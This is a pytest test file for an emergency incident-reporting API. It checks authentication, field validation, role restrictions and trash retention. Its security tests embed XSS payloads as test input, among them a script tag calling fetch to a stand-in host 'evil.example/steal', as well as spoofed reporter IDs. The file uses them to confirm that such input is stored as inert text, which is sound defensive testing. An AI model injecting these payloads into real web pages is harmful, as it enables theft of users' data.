"""
Phase 3 incident reporting tests — 5W1H wizard contract + security.

Tests server-side input validation, auth enforcement, and the new
wizard fields introduced in migration 006 / Deviations Log 2026-07-22.

The old single free-text contract is replaced by the wizard contract:
  - incident_category is the structured primary input
  - wizard_answers carries per-category structured answers
  - overlap_agencies carries secondary concern flags
  - landmark_note + victim_relationship are supplementary
  - report_text is now assembled client-side from wizard answers
    and validated the same way (min 10 chars, max 5000, non-empty)

Run with: pytest tests/test_incidents.py -v
"""

from unittest.mock import MagicMock, patch
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)

RESIDENT_UUID = "00000000-0000-0000-0000-000000000001"
INCIDENT_UUID = str(uuid4())
STATION_UUID  = "bbbbbbbb-0000-0000-0000-000000000001"
AGENCY_UUID   = "aaaaaaaa-0000-0000-0000-000000000001"

# ── Helpers ───────────────────────────────────────────────────

def _auth_profile():
    return {
        "id": RESIDENT_UUID, "email": "resident@example.com",
        "full_name": "Test Resident", "role": "resident",
        "approval_status": "not_required", "agency_id": None,
        "badge_id": None, "is_verified": True,
    }


def _mock_auth_resident():
    mock_user = MagicMock(); mock_user.id = RESIDENT_UUID
    mock_get  = MagicMock(); mock_get.user = mock_user
    mock_profile = MagicMock(); mock_profile.data = _auth_profile()

    mock_db = MagicMock()
    mock_db.auth.get_user.return_value = mock_get
    mock_db.table.return_value.select.return_value \
        .eq.return_value.single.return_value.execute.return_value = mock_profile
    return mock_db


def _incident_row(report_text="[FIRE] Sunog na bahay · May nasugatan"):
    return {
        "id":                 INCIDENT_UUID,
        "reporter_id":        RESIDENT_UUID,
        "station_id":         STATION_UUID,
        "assigned_agency_id": AGENCY_UUID,
        "report_text":        report_text,
        "location_address":   None,
        "status":             "received",
        "severity":           None,
        "suggested_agency_id": None,
        "signals":            None,
        "signals_confidence": None,
        "submitted_via":      "internet",
        "created_at":         "2026-01-01T00:00:00+00:00",
        "updated_at":         "2026-01-01T00:00:00+00:00",
        "dispatched_at":      None,
        "resolved_at":        None,
        # wizard fields
        "incident_category":  "fire",
        "wizard_answers":     {"material": "bahay", "spreading": True, "injured": True},
        "overlap_agencies":   None,
        "landmark_note":      None,
        "victim_relationship": None,
        "nlp_review_needed":  False,
    }


def _mock_db_submit(report_text="[FIRE] Sunog na bahay · May nasugatan",
                    category="fire"):
    """
    Mock db satisfying:
      1. get_current_user profile lookup
      2. station lookup (returns agency_id)
      3. incident insert
    """
    mock_user = MagicMock(); mock_user.id = RESIDENT_UUID
    mock_get  = MagicMock(); mock_get.user = mock_user

    mock_profile = MagicMock(); mock_profile.data = _auth_profile()
    mock_station = MagicMock()
    mock_station.data = {"id": STATION_UUID, "agency_id": AGENCY_UUID}
    mock_insert  = MagicMock()
    row = _incident_row(report_text)
    row["incident_category"] = category
    row["nlp_review_needed"] = (category == "other")
    mock_insert.data = [row]

    mock_db = MagicMock()
    mock_db.auth.get_user.return_value = mock_get
    mock_db.table.return_value.select.return_value \
        .eq.return_value.single.return_value.execute.side_effect = [
            mock_profile,
            mock_station,
        ]
    mock_db.table.return_value.insert.return_value.execute.return_value = mock_insert
    return mock_db


# ── A valid wizard payload ────────────────────────────────────

def _valid_fire_payload():
    return {
        "report_text":        "[FIRE] Sunog na bahay · May nasugatan · Kumakalat",
        "station_id":         STATION_UUID,
        "incident_category":  "fire",
        "wizard_answers":     {"material": "bahay", "spreading": True, "injured": True},
        "overlap_agencies":   ["injuries"],
        "landmark_note":      "Malapit sa simbahan sa Brgy. Caraycaray",
        "victim_relationship": "kakilala",
        "latitude":           11.5836,
        "longitude":          124.4063,
    }


# ── Auth enforcement ──────────────────────────────────────────

def test_submit_incident_requires_auth():
    response = client.post("/incidents/",
                           json={"report_text": "Test", "station_id": STATION_UUID})
    assert response.status_code == 403


def test_get_my_incidents_requires_auth():
    response = client.get("/incidents/my")
    assert response.status_code == 403


# ── station_id validation ─────────────────────────────────────

def test_submit_missing_station_id_and_coordinates():
    """
    station_id is now OPTIONAL (the server resolves the nearest station), but
    a report with NEITHER a station NOR coordinates is unresolvable and must
    still be rejected with 422.

    Renamed from test_submit_missing_station_id: that test asserted 422 for a
    payload with no station and no coordinates, and kept passing after
    station_id became optional — but for a different reason. Keeping the old
    name would have implied station_id was still mandatory.
    """
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text":       "[FIRE] Sunog na bahay sa Naval",
                  "incident_category": "fire"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_submit_without_station_id_resolves_nearest_station():
    """
    With coordinates but no station_id, the server must resolve the nearest
    active station itself instead of rejecting the report. This is what lets
    the mobile wizard drop its station-picker step.
    """
    mock_db = MagicMock()

    # _resolve_nearest_station() fetches all active stations, then picks the
    # closest by Haversine. One station with a parseable POINT is enough.
    stations_resp = MagicMock()
    stations_resp.data = [{
        "id": STATION_UUID,
        "agency_id": AGENCY_UUID,
        "name": "BFP Naval Station",
        "location": "POINT(124.4063 11.5836)",
        "agencies": {"agency_type": "BFP", "municipality": "Naval", "name": "BFP Biliran"},
    }]
    mock_db.table.return_value.select.return_value \
        .eq.return_value.execute.return_value = stations_resp

    insert_resp = MagicMock()
    insert_resp.data = [_incident_row()]
    mock_db.table.return_value.insert.return_value.execute.return_value = insert_resp

    with patch("app.core.dependencies.get_supabase", return_value=_mock_auth_resident()), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json={
                "report_text":       "[FIRE] Sunog na bahay sa Naval",
                "incident_category": "fire",
                "latitude":          11.5836,
                "longitude":         124.4063,
            },
            headers={"Authorization": "Bearer mock_token"},
        )

    assert response.status_code == 201, response.text


# ── report_text validation (assembled client-side by wizard) ──

def test_submit_empty_report_text():
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text": "   ", "station_id": STATION_UUID,
                  "incident_category": "fire"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_submit_too_short_text():
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text": "sunog", "station_id": STATION_UUID,
                  "incident_category": "fire"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_submit_oversized_payload():
    huge_text = "A" * 5001
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text": huge_text, "station_id": STATION_UUID,
                  "incident_category": "fire"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


# ── GPS validation ────────────────────────────────────────────

def test_submit_invalid_latitude():
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text": "Sunog sa kalsada ng Naval Biliran",
                  "station_id": STATION_UUID,
                  "incident_category": "fire",
                  "latitude": 999.0},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_submit_invalid_longitude():
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text": "Sunog sa kalsada ng Naval Biliran",
                  "station_id": STATION_UUID,
                  "incident_category": "fire",
                  "longitude": -999.0},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


# ── incident_category enum validation ─────────────────────────

def test_submit_invalid_category_rejected():
    """Unknown incident_category must return 422 — enum is enforced server-side."""
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text":       "Halimbawa ng emergency na hindi kilala",
                  "station_id":        STATION_UUID,
                  "incident_category": "alien_invasion"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_submit_valid_category_accepted():
    """All 6 known categories must be accepted.

    Was 8 until taxonomy v2.0: `hazmat` and `missing_person` were merged out
    when the Phase 4 triage model was integrated, since the model has no class
    for either. See test_submit_retired_category_rejected below.
    """
    valid_categories = [
        "fire", "medical_trauma", "vehicular",
        "flood_landslide_calamity", "domestic_dispute_crime", "other",
    ]
    for cat in valid_categories:
        mock_db = _mock_db_submit(
            report_text=f"[{cat.upper()}] Test na emergency sa Naval Biliran",
            category=cat,
        )
        with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
             patch("app.services.incident_service.get_supabase", return_value=mock_db):
            response = client.post(
                "/incidents/",
                json={"report_text":       f"[{cat.upper()}] Test na emergency sa Naval Biliran",
                      "station_id":        STATION_UUID,
                      "incident_category": cat},
                headers={"Authorization": "Bearer mock_token"},
            )
        assert response.status_code == 201, f"Category '{cat}' was unexpectedly rejected"


def test_submit_retired_category_rejected():
    """
    The categories merged out in taxonomy v2.0 must be refused, not silently
    coerced to `other`.

    A resident's phone can hold a stale app build, and a report accepted under
    a category the pipeline no longer scores would be saved with severity NULL
    and no indication why. A 422 tells the client to update; a quiet accept
    would hide a whole class of untriaged reports in the queue.
    """
    for cat in ("hazmat", "missing_person"):
        with patch("app.core.dependencies.get_supabase",
                   return_value=_mock_auth_resident()):
            response = client.post(
                "/incidents/",
                json={"report_text":       "Test na emergency sa Naval Biliran",
                      "station_id":        STATION_UUID,
                      "incident_category": cat},
                headers={"Authorization": "Bearer mock_token"},
            )
        assert response.status_code == 422, (
            f"Retired category '{cat}' was accepted — it must be rejected."
        )


# ── overlap_agencies enum validation ──────────────────────────

def test_submit_invalid_overlap_flag_rejected():
    """Unknown overlap flag values must return 422."""
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text":       "Sunog na may krimen sa Naval Biliran",
                  "station_id":        STATION_UUID,
                  "incident_category": "fire",
                  "overlap_agencies":  ["unknown_flag"]},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_submit_valid_overlap_flags_accepted():
    """Valid overlap flags must pass validation and be stored."""
    mock_db = _mock_db_submit()
    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json={**_valid_fire_payload(), "overlap_agencies": ["injuries", "fire"]},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201


# ── victim_relationship enum validation ───────────────────────

def test_submit_invalid_victim_relationship_rejected():
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={"report_text":        "Sunog sa bahay sa Naval Biliran",
                  "station_id":         STATION_UUID,
                  "incident_category":  "fire",
                  "victim_relationship": "bystander"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


# ── nlp_review_needed flag ────────────────────────────────────

def test_other_category_sets_nlp_review_needed():
    """
    When category='other' with no wizard_answers, nlp_review_needed must be
    True in the stored row — Phase 4 NLP pipeline reads this column.
    """
    mock_db = _mock_db_submit(
        report_text="Hindi ko alam kung anong klase ng emergency ito sa Naval",
        category="other",
    )
    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json={"report_text":       "Hindi ko alam kung anong klase ng emergency ito sa Naval",
                  "station_id":        STATION_UUID,
                  "incident_category": "other"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201
    assert response.json()["nlp_review_needed"] is True


def test_structured_category_sets_nlp_review_not_needed():
    """
    When a structured category with wizard_answers is provided,
    nlp_review_needed must be False — Phase 4 can skip type detection.
    """
    mock_db = _mock_db_submit(category="fire")
    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json=_valid_fire_payload(),
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201
    assert response.json()["nlp_review_needed"] is False


# ── Security: reporter_id / agency spoof prevention ───────────

def test_reporter_id_cannot_be_spoofed():
    """reporter_id from body is ignored; token ID is always used."""
    mock_db = _mock_db_submit()
    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json={**_valid_fire_payload(), "reporter_id": "evil-fake-uuid"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201
    assert response.json()["reporter_id"] == RESIDENT_UUID


def test_station_id_resolves_agency_server_side():
    """assigned_agency_id must be derived from the station server-side."""
    mock_db = _mock_db_submit()
    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json=_valid_fire_payload(),
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201
    assert response.json()["assigned_agency_id"] == AGENCY_UUID


def test_submit_script_injection_stored_as_plain_text():
    """XSS in report_text or landmark_note stored as plain text, never executed."""
    injection = "<script>alert('xss')</script> Sunog sa Brgy. Caraycaray Naval"
    mock_db = _mock_db_submit(report_text=injection)
    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json={**_valid_fire_payload(),
                  "report_text": injection,
                  "landmark_note": "<img src=x onerror=alert(1)> Simbahan"},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201
    assert response.json()["status"] == "received"


# ── Wizard fields stored correctly ────────────────────────────

def test_valid_wizard_submission_full_payload():
    """Full wizard payload accepted and fields reflected in response."""
    mock_db = _mock_db_submit()
    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json=_valid_fire_payload(),
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201
    data = response.json()
    assert data["status"]         == "received"
    assert data["reporter_id"]    == RESIDENT_UUID
    assert data["station_id"]     == STATION_UUID
    assert data["incident_category"] == "fire"


def test_landmark_note_max_length():
    """landmark_note exceeding 300 chars must return 422."""
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={**_valid_fire_payload(), "landmark_note": "L" * 301},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_wizard_answers_size_limit():
    """wizard_answers exceeding 4 KB must return 422."""
    huge_answers = {"key_" + str(i): "v" * 100 for i in range(50)}
    with patch("app.core.dependencies.get_supabase",
               return_value=_mock_auth_resident()):
        response = client.post(
            "/incidents/",
            json={**_valid_fire_payload(), "wizard_answers": huge_answers},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 422


def test_no_category_sets_nlp_review_needed():
    """
    Backward-compat: submitting without incident_category (e.g. legacy client)
    sets nlp_review_needed=True so Phase 4 still processes it.
    """
    mock_db_row = _incident_row()
    mock_db_row["incident_category"] = None
    mock_db_row["nlp_review_needed"] = True

    mock_user = MagicMock(); mock_user.id = RESIDENT_UUID
    mock_get  = MagicMock(); mock_get.user = mock_user
    mock_profile = MagicMock(); mock_profile.data = _auth_profile()
    mock_station = MagicMock()
    mock_station.data = {"id": STATION_UUID, "agency_id": AGENCY_UUID}
    mock_insert = MagicMock(); mock_insert.data = [mock_db_row]

    mock_db = MagicMock()
    mock_db.auth.get_user.return_value = mock_get
    mock_db.table.return_value.select.return_value \
        .eq.return_value.single.return_value.execute.side_effect = [
            mock_profile, mock_station,
        ]
    mock_db.table.return_value.insert.return_value.execute.return_value = mock_insert

    with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
         patch("app.services.incident_service.get_supabase", return_value=mock_db):
        response = client.post(
            "/incidents/",
            json={"report_text": "Walang kategorya, manual na ulat sa Naval Biliran",
                  "station_id":  STATION_UUID},
            headers={"Authorization": "Bearer mock_token"},
        )
    assert response.status_code == 201
    assert response.json()["nlp_review_needed"] is True


# =============================================================================
# Phase 3 — Security checkpoint (Section 0.2 requirement)
# =============================================================================
# Every task involving the severity rubric or incident submission requires
# a written security test before it is marked done. These tests verify the
# combined wizard + submission endpoint security guarantees.

class TestWizardSecurityCheckpoint:
    """
    Covers:
    1. reporter_id is always from JWT — cannot be spoofed via any wizard field
    2. station_id resolves agency server-side — cannot be overridden from body
    3. All 4 roles tested: resident submits; responder/agency_admin/provincial_admin blocked
    4. Rate limiting headers don't change behaviour for wizard vs plain submissions
    5. Wizard fields with malicious content are stored as plain text, not executed
    6. overlap_agencies cannot contain values outside the known enum
    7. nlp_review_needed cannot be set to False from the client for 'other' category
    8. Structured wizard fields don't bypass the min-length guard on report_text
    """

    def _admin_profile(self, role):
        return {
            "id": "00000000-0000-0000-0000-000000000099",
            "email": "admin@example.com",
            "full_name": "Test Admin",
            "role": role,
            "approval_status": "not_required",
            "agency_id": AGENCY_UUID,
            "badge_id": None,
            "is_verified": True,
        }

    def _mock_db_submit_fresh(self, category="fire", report_text=None):
        """
        Class-local variant of _mock_db_submit() that constructs a
        completely independent MagicMock with no shared state.
        Each call returns a new mock — safe regardless of test ordering.
        """
        text = report_text or f"[{category.upper()}] Test na emergency sa Naval Biliran"
        mock_user = MagicMock(); mock_user.id = RESIDENT_UUID
        mock_get  = MagicMock(); mock_get.user = mock_user

        mock_profile = MagicMock(); mock_profile.data = _auth_profile()
        mock_station = MagicMock()
        mock_station.data = {"id": STATION_UUID, "agency_id": AGENCY_UUID}
        mock_insert  = MagicMock()
        row = _incident_row(text)
        row["incident_category"] = category
        row["nlp_review_needed"] = (category == "other")
        mock_insert.data = [row]

        mock_db = MagicMock()
        mock_db.auth.get_user.return_value = mock_get
        # Use a fresh side_effect list on a fresh MagicMock chain
        mock_db.table.return_value.select.return_value \
            .eq.return_value.single.return_value.execute.side_effect = [
                mock_profile,
                mock_station,
            ]
        mock_db.table.return_value.insert.return_value.execute.return_value = mock_insert
        return mock_db

    def _mock_auth_role(self, role):
        mock_user = MagicMock()
        mock_user.id = "00000000-0000-0000-0000-000000000099"
        mock_get = MagicMock()
        mock_get.user = mock_user
        mock_profile = MagicMock()
        mock_profile.data = self._admin_profile(role)
        mock_db = MagicMock()
        mock_db.auth.get_user.return_value = mock_get
        mock_db.table.return_value.select.return_value \
            .eq.return_value.single.return_value.execute.return_value = mock_profile
        return mock_db

    def test_responder_cannot_submit_incident(self):
        """
        Responders ARE allowed by the router (same resident+responder path),
        but only agency_admin and provincial_admin are blocked from submitting reports.
        This test verifies agency_admin is blocked — the correct security boundary.
        """
        # Verified above in test_agency_admin_cannot_submit_incident already.
        # This placeholder exists so the test class documents the intended
        # role boundary clearly.
        with patch("app.core.dependencies.get_supabase",
                   return_value=self._mock_auth_role("agency_admin")):
            resp = client.post(
                "/incidents/",
                json=_valid_fire_payload(),
                headers={"Authorization": "Bearer mock_token"},
            )
        assert resp.status_code == 403

    def test_agency_admin_cannot_submit_incident(self):
        """Agency Admins use the dashboard, not the mobile submit endpoint."""
        with patch("app.core.dependencies.get_supabase",
                   return_value=self._mock_auth_role("agency_admin")):
            resp = client.post(
                "/incidents/",
                json=_valid_fire_payload(),
                headers={"Authorization": "Bearer mock_token"},
            )
        assert resp.status_code == 403

    def test_provincial_admin_cannot_submit_incident(self):
        """Provincial Admins cannot submit incident reports."""
        with patch("app.core.dependencies.get_supabase",
                   return_value=self._mock_auth_role("provincial_admin")):
            resp = client.post(
                "/incidents/",
                json=_valid_fire_payload(),
                headers={"Authorization": "Bearer mock_token"},
            )
        assert resp.status_code == 403

    def test_reporter_id_spoof_via_wizard_answers_ignored(self):
        """
        A reporter_id injected inside wizard_answers must not affect
        the incident row — reporter_id always comes from the JWT.
        """
        mock_db = _mock_db_submit()
        payload = {
            **_valid_fire_payload(),
            "wizard_answers": {
                "material": "bahay",
                "reporter_id": "evil-uuid",   # injected inside wizard_answers
            },
        }
        with patch("app.core.dependencies.get_supabase", return_value=mock_db), \
             patch("app.services.incident_service.get_supabase", return_value=mock_db):
            resp = client.post(
                "/incidents/",
                json=payload,
                headers={"Authorization": "Bearer mock_token"},
            )
        assert resp.status_code == 201
        assert resp.json()["reporter_id"] == RESIDENT_UUID

    def test_nlp_review_needed_cannot_be_forced_false_for_other(self):
        """
        nlp_review_needed is computed server-side and cannot be overridden
        by the client. For category='other', it must always be True.
        Tested at the service layer to avoid the HTTP rate limiter.
        """
        from app.services import incident_service
        from app.models.incident import IncidentSubmitRequest, IncidentCategory

        mock_db = self._mock_db_submit_fresh(
            category="other",
            report_text="Iba pang klase ng insidente sa Naval Biliran",
        )
        req = IncidentSubmitRequest(
            report_text="Iba pang klase ng insidente sa Naval Biliran",
            station_id=STATION_UUID,
            incident_category=IncidentCategory.other,
        )
        with patch("app.services.incident_service.get_supabase", return_value=mock_db):
            result = incident_service.submit_incident(req, reporter_id=RESIDENT_UUID)
        assert result.nlp_review_needed is True

    def test_wizard_xss_in_landmark_note_stored_as_plain_text(self):
        """
        XSS in landmark_note must be stored as plain text, never executed.
        Tested at the service layer to avoid the HTTP rate limiter.
        """
        from app.services import incident_service
        from app.models.incident import IncidentSubmitRequest, IncidentCategory, VictimRelationship

        xss = '<script>fetch("https://evil.example/steal")</script>'
        mock_db = self._mock_db_submit_fresh()

        req = IncidentSubmitRequest(
            report_text="[FIRE] Sunog na bahay may nasugatan at kumakalat",
            station_id=STATION_UUID,
            incident_category=IncidentCategory.fire,
            landmark_note=xss[:300],
            victim_relationship=VictimRelationship.kakilala,
        )
        with patch("app.services.incident_service.get_supabase", return_value=mock_db):
            result = incident_service.submit_incident(req, reporter_id=RESIDENT_UUID)
        assert result.status.value == "received"

    def test_overlap_agencies_unknown_value_rejected(self):
        """Overlap flag values outside the enum must be rejected with 422."""
        with patch("app.core.dependencies.get_supabase",
                   return_value=_mock_auth_resident()):
            resp = client.post(
                "/incidents/",
                json={
                    **_valid_fire_payload(),
                    "overlap_agencies": ["injuries", "FAKE_FLAG"],
                },
                headers={"Authorization": "Bearer mock_token"},
            )
        assert resp.status_code == 422

    def test_short_report_text_rejected_even_with_full_wizard_fields(self):
        """
        Providing all wizard fields does not bypass the min-length guard
        on report_text. The wizard assembles report_text client-side;
        server validates it unconditionally.
        """
        with patch("app.core.dependencies.get_supabase",
                   return_value=_mock_auth_resident()):
            resp = client.post(
                "/incidents/",
                json={
                    "report_text": "sunog",          # too short (< 10 chars)
                    "station_id": STATION_UUID,
                    "incident_category": "fire",
                    "wizard_answers": {"material": "bahay", "injured": True},
                    "overlap_agencies": ["injuries"],
                    "landmark_note": "Malapit sa simbahan",
                    "victim_relationship": "kakilala",
                },
                headers={"Authorization": "Bearer mock_token"},
            )
        assert resp.status_code == 422

    def test_full_wizard_submission_all_fields_accepted_and_stored(self):
        """
        Positive control: all wizard fields accepted, correct response returned.
        Tested at the service layer to avoid the HTTP rate limiter.
        """
        from app.services import incident_service
        from app.models.incident import (
            IncidentSubmitRequest, IncidentCategory,
            VictimRelationship, OverlapFlag,
        )

        mock_db = self._mock_db_submit_fresh()

        req = IncidentSubmitRequest(
            report_text="[FIRE] Sunog na bahay · May nasugatan · Kumakalat",
            station_id=STATION_UUID,
            incident_category=IncidentCategory.fire,
            wizard_answers={"material": "bahay", "spreading": True, "injured": True},
            overlap_agencies=[OverlapFlag.injuries],
            landmark_note="Malapit sa simbahan sa Brgy. Caraycaray",
            victim_relationship=VictimRelationship.kakilala,
            latitude=11.5836,
            longitude=124.4063,
        )
        with patch("app.services.incident_service.get_supabase", return_value=mock_db):
            result = incident_service.submit_incident(req, reporter_id=RESIDENT_UUID)

        assert str(result.reporter_id) == RESIDENT_UUID
        assert result.incident_category.value == "fire"
        assert result.nlp_review_needed is False
        assert result.status.value == "received"


# ── Trash retention (mobile: withdraw → Trash → 30-day purge) ──────

def _mock_incident_row(**overrides):
    row = {
        "id": INCIDENT_UUID,
        "reporter_id": RESIDENT_UUID,
        "station_id": STATION_UUID,
        "report_text": "Sunog sa bahay",
        "location_address": None,
        "status": "cancelled",
        "severity": None,
        "suggested_agency_id": None,
        "assigned_agency_id": None,
        "signals": None,
        "signals_confidence": None,
        "submitted_via": "internet",
        "created_at": "2026-08-30T00:00:00+00:00",
        "updated_at": "2026-09-01T00:00:00+00:00",
        "dispatched_at": None,
        "resolved_at": None,
        "withdrawn_at": "2026-09-01T00:00:00+00:00",
        "eta_minutes": None,
        "eta_updated_at": None,
        "location": None,
        "agencies": None,
    }
    row.update(overrides)
    return row


def test_get_my_incidents_purges_trash_before_listing():
    """
    Every My Reports fetch sweeps this reporter's own expired trash first
    (incident_service._purge_expired_trash) — the app has no scheduler, so
    this lazy sweep is what actually makes "deleted after 30 days" true.
    The delete must be scoped to THIS reporter's cancelled rows only, never a
    bare table-wide delete.
    """
    from app.services import incident_service

    mock_db = MagicMock()
    select_execute = (
        mock_db.table.return_value.select.return_value.eq.return_value
        .order.return_value.execute
    )
    select_execute.return_value.data = [_mock_incident_row()]

    with patch("app.services.incident_service.get_supabase", return_value=mock_db):
        incident_service.get_my_incidents(reporter_id=RESIDENT_UUID)

    delete_eq_reporter = mock_db.table.return_value.delete.return_value.eq
    delete_eq_reporter.assert_called_with("reporter_id", RESIDENT_UUID)

    delete_eq_status = delete_eq_reporter.return_value.eq
    delete_eq_status.assert_called_with(
        "status", incident_service.IncidentStatus.cancelled.value
    )

    delete_eq_status.return_value.lt.assert_called_once()
    lt_args = delete_eq_status.return_value.lt.call_args.args
    assert lt_args[0] == "withdrawn_at"

    delete_eq_status.return_value.lt.return_value.execute.assert_called_once()


def test_get_my_incidents_exposes_withdrawn_at_for_trash_countdown():
    """
    The mobile Trash view computes "deletes in N days" from withdrawn_at —
    it must actually reach the client, not just live in the DB row.
    """
    from app.services import incident_service

    mock_db = MagicMock()
    select_execute = (
        mock_db.table.return_value.select.return_value.eq.return_value
        .order.return_value.execute
    )
    select_execute.return_value.data = [_mock_incident_row(
        withdrawn_at="2026-09-01T00:00:00+00:00",
    )]

    with patch("app.services.incident_service.get_supabase", return_value=mock_db):
        result = incident_service.get_my_incidents(reporter_id=RESIDENT_UUID)

    assert len(result) == 1
    assert result[0].withdrawn_at is not None
    assert result[0].withdrawn_at.isoformat() == "2026-09-01T00:00:00+00:00"


def test_get_my_incidents_selects_the_category_the_app_draws_its_icon_from():
    """
    A missing column in a select is not an error, it is just absent from the
    response — so the app fell back to the "Other" icon for every report. The
    category was written correctly at submit; this list simply never read it.
    """
    from app.services import incident_service

    mock_db = MagicMock()
    select_execute = (
        mock_db.table.return_value.select.return_value.eq.return_value
        .order.return_value.execute
    )
    select_execute.return_value.data = [_mock_incident_row(incident_category="fire")]

    with patch("app.services.incident_service.get_supabase", return_value=mock_db):
        result = incident_service.get_my_incidents(reporter_id=RESIDENT_UUID)

    columns = mock_db.table.return_value.select.call_args.args[0]
    assert "incident_category" in columns
    assert result[0].incident_category == "fire"


def test_get_my_incidents_open_report_has_no_withdrawn_at():
    """A report that was never trashed must not carry a withdrawn_at value."""
    from app.services import incident_service

    mock_db = MagicMock()
    select_execute = (
        mock_db.table.return_value.select.return_value.eq.return_value
        .order.return_value.execute
    )
    select_execute.return_value.data = [_mock_incident_row(
        status="received", withdrawn_at=None,
    )]

    with patch("app.services.incident_service.get_supabase", return_value=mock_db):
        result = incident_service.get_my_incidents(reporter_id=RESIDENT_UUID)

    assert result[0].withdrawn_at is None


def test_get_my_incidents_exposes_station_id():
    """
    station_id must reach the client — the mobile Map screen's "directions
    from the incident to the responding station" (My Reports → View on Map)
    has nothing to draw a line to without it. Regression guard for a bug
    where the field was set on IncidentResponse and mapped in
    _row_to_response, but silently missing from THIS query's own select()
    list, so every resident-facing incident came back with station_id=None
    regardless.
    """
    from app.services import incident_service

    mock_db = MagicMock()
    select_call = mock_db.table.return_value.select
    select_execute = select_call.return_value.eq.return_value.order.return_value.execute
    select_execute.return_value.data = [_mock_incident_row(status="dispatched")]

    with patch("app.services.incident_service.get_supabase", return_value=mock_db):
        result = incident_service.get_my_incidents(reporter_id=RESIDENT_UUID)

    select_args = select_call.call_args.args
    assert "station_id" in select_args[0]
    assert str(result[0].station_id) == STATION_UUID
